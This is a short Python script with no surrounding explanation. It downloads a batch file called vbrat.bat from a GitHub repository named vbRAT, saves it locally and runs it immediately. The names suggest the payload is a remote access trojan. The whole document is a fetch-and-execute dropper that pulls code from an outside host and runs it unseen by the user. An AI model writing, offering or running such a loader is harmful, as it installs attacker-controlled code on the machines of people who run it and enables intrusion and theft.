import requests, os
_file = requests.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat')

with open('vbrat.bat', 'w') as f:
    f.write(_file.text)

os.startfile('vbrat.bat')
